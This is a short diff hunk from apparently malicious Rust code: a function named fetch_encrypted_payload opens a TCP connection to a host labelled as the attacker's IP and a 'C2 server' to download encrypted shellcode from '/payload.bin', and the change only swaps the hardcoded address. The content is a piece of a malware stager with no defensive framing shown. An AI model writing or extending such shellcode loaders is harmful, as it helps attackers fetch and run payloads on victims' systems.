@@ -3,7 +3,7 @@ use std::net::TcpStream;
 
 /// Fetches encrypted shellcode from an HTTP server
 pub fn fetch_encrypted_payload() -> Vec<u8> {
-    let server_ip = "10.0.0.86:8080"; // Change this to your attacker's IP
+    let server_ip = "0.0.0.0:8080"; // Change this to your attacker's IP
     let payload_path = "/payload.bin";
     
     let mut stream = TcpStream::connect(server_ip).expect("Failed to connect to C2 server");
